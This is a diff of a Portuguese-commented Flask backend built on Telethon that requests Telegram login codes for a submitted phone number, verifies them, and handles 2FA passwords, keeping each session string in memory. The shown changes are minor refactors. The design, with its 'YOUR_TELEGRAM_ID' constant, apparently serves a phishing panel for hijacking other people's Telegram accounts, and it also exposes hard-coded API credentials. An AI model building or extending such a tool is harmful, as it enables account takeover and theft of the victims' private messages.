@@ -4,14 +4,13 @@ from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 import requests
-import os
 import asyncio
 
 app = Flask(__name__, static_folder='static')
 CORS(app)
 
 # ==========================================
-# SUAS CHAVES AQUI
+# SUAS CHAVES (JÁ PREENCHIDAS)
 # ==========================================
 API_ID = 32082548
 API_HASH = "84d9bae1c33f59eba8b187619d6f7"
@@ -20,6 +19,12 @@ YOUR_TELEGRAM_ID = 7783406880
 # ==========================================
 
 clients = {}
+
+# FUNÇÃO AUXILIAR PARA CRIAR O LOOP
+def get_loop():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    return loop
 
 @app.route('/')
 def index():
@@ -33,10 +38,7 @@ def request_code():
         return jsonify({"success": False, "error": "Telefone invalido"}), 400
 
     try:
-        # CRIA UM LOOP PARA ESSA THREAD DO FLASK
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
+        loop = get_loop()
         client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
         client.connect()
         
@@ -44,7 +46,7 @@ def request_code():
         clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
         return jsonify({"success": True}), 200
     except Exception as e:
-        print(f"ERRO NO TELEGRAM: {str(e)}")
+        print(f"ERRO NO TELEGRAM (request_code): {str(e)}")
         return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/verify_code', methods=['POST'])
@@ -75,7 +77,7 @@ def verify_code():
     except SessionPasswordNeededError:
         return jsonify({"success": False, "error": "2FA_REQUIRED"}), 200
     except Exception as e:
-        print(f"ERRO NO TELEGRAM: {str(e)}")
+        print(f"ERRO NO TELEGRAM (verify_code): {str(e)}")
         return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/verify_2fa', methods=['POST'])
